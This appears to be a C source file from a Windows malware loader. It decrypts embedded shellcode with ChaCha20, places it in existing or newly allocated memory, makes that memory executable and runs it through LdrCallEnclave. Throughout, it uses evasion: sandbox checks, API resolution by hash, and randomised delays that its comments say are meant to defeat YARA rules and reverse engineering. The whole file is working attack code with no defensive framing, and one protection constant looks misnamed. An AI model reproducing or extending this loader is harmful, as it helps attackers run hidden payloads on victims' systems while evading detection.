#include "memory.h"
#include "stealth_loader.h"
#include "evasion.h"
#include "crypto.h"
#include "api_resolver.h"

PVOID find_memory_region(size_t size) {
    SYSTEM_INFO system_info;
    GetSystemInfo(&system_info);

    // system resource entropy so its harder to detect and hunt down/reverse :d
    ULONGLONG entropy_value = (GetCurrentProcessId() * GetTickCount()) ^ (ULONGLONG)GetCurrentThreadId() ^ __rdtsc();
    PBYTE current_address = (PBYTE)system_info.lpMinimumApplicationAddress;
    current_address += (entropy_value * 0x1000) % 
           (SIZE_T)(system_info.lpMaximumApplicationAddress - system_info.lpMinimumApplicationAddress);
    
    MEMORY_BASIC_INFORMATION memory_info;
    SIZE_T query_result;
    
    for (PBYTE address = current_address; address < system_info.lpMaximumApplicationAddress; address += memory_info.RegionSize) {
        if ((ULONGLONG)address % 0x2000 == 0) {
            precise_delay(1 + (__rdtsc() % 3), 0.1f);
        }
        
        query_result = VirtualQuery(address, &memory_info, sizeof(memory_info));
        if (query_result == 0) break;
        
        if (memory_info.State == MEM_COMMIT && 
            (memory_info.Protect & (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_READWRITE)) &&
            !(memory_info.Protect & (PAGE_GUARD | PAGE_NOACCESS)) &&
            memory_info.RegionSize >= size) {
            if (is_region_safe(address, size)) {
                return memory_info.BaseAddress;
            }
        }
    }
    
    return NULL;
}

HMODULE load_tprtdll() {
    // if in memory, best case for  us 
    HMODULE module_handle = GetModuleHandleW(L"tprtdll.dll");
    if (module_handle) return module_handle;

    // stealthy from disk, second choice
    module_handle = LoadLibraryExW(L"tprtdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES | LOAD_LIBRARY_SEARCH_SYSTEM32);
    if (module_handle) return module_handle;

    //fallback 
    return GetModuleHandleA("ntdll.dll");
}

void execute_payload() {
    if (!is_safe_environment()) {
        return;
    }


    //entropy based jitter  to kill yara rules 
    ULONGLONG timer_value = __rdtsc();
    precise_delay(200 + (timer_value % 500), 0.4f);
    
    HMODULE target_module = load_tprtdll();
    if (!target_module) {
        target_module = GetModuleHandleA("ntdll.dll");
    }
    
    _NtAllocateVirtualMemoryEx allocate_memory = 
        (_NtAllocateVirtualMemoryEx)get_function_by_hash_stealth(target_module, compute_custom_hash("NtAllocateVirtualMemoryEx"));
    _NtProtectVirtualMemory protect_memory = 
        (_NtProtectVirtualMemory)get_function_by_hash_stealth(target_module, compute_custom_hash("NtProtectVirtualMemory"));
    
    HMODULE ntdll_module = GetModuleHandleA("ntdll.dll");
    _LdrCallEnclave call_enclave = 
        (_LdrCallEnclave)get_function_by_hash_stealth(ntdll_module, compute_custom_hash("LdrCallEnclave"));
    
    if (!allocate_memory || !protect_memory || !call_enclave) {
        return;
    }
    
    BYTE encryption_key[32];
    BYTE initialization_vector[12];
    if (!derive_encryption_key_chacha_stealth(encryption_key, sizeof(encryption_key), initialization_vector, sizeof(initialization_vector))) {
        return;
    }
    
    PVOID code_address = find_memory_region(encrypted_shellcode_size);
    BOOL memory_allocated = FALSE;
    
    if (!code_address) {
        SIZE_T allocation_size = encrypted_shellcode_size + (__rdtsc() % 0x800);
        NTSTATUS result = allocate_memory(
            GetCurrentProcess(),
            &code_address,
            &allocation_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
            NULL,
            0
        );
        
        if (result != 0) {
            return;
        }
        memory_allocated = TRUE;
    }
    
    for (size_t position = 0; position < encrypted_shellcode_size; position += 0x100) {
        size_t block_size = min(0x100, encrypted_shellcode_size - position);
        memcpy((PBYTE)code_address + position, (PBYTE)encrypted_shellcode + position, block_size);
        precise_delay(1 + (__rdtsc() % 2), 0.1f);
    }

    // chacha20 custom stealth where we smash to chunks with scattered memcpy and chunking with micro delays
    size_t chunk_size = 512 + (__rdtsc() % 512);
    for (size_t offset = 0; offset < encrypted_shellcode_size; ) {
        size_t current_chunk = chunk_size + (GetTickCount() % 256);
        if (offset + current_chunk > encrypted_shellcode_size) {
            current_chunk = encrypted_shellcode_size - offset;
        }
        
        chacha20_cryptography((PBYTE)code_address + offset, current_chunk, 
                             encryption_key, sizeof(encryption_key), initialization_vector);
        
        offset += current_chunk;
        precise_delay(1 + (__rdtsc() % 4), 0.2f);
    }
    
    if (memory_allocated) {
        SIZE_T memory_size = encrypted_shellcode_size;
        ULONG original_protection;
        NTSTATUS status = protect_memory(
            GetCurrentProcess(),
            &code_address,
            &memory_size,
            PAGE_EXECUTE_READ_WRITE,
            &original_protection
        );
        
        if (status == 0) {
            status = protect_memory(
                GetCurrentProcess(),
                &code_address,
                &memory_size,
                PAGE_EXECUTE_READ,
                &original_protection
            );
        }
        
        if (status != 0) {
            SecureZeroMemory(code_address, encrypted_shellcode_size);
            VirtualFree(code_address, 0, MEM_RELEASE);
            return;
        }
    }
    
    FlushInstructionCache(GetCurrentProcess(), code_address, encrypted_shellcode_size);
    
    PVOID parameter = NULL;
    
    if (call_enclave) {
        precise_delay(50 + (__rdtsc() % 100), 0.1f);
        call_enclave((PENCLAVE_ROUTINE)code_address, 0, &parameter);
    }
    // more jitter >:3
    precise_delay(100 + (GetCurrentThreadId() % 200), 0.2f);
    
    if (memory_allocated) {
        SIZE_T free_size = encrypted_shellcode_size;
        ULONG old_protect;
        protect_memory(
            GetCurrentProcess(),
            &code_address,
            &free_size,
            PAGE_READWRITE,
            &old_protect
        );
        
        SecureZeroMemory(code_address, encrypted_shellcode_size);
        VirtualFree(code_address, 0, MEM_RELEASE);
    }
}
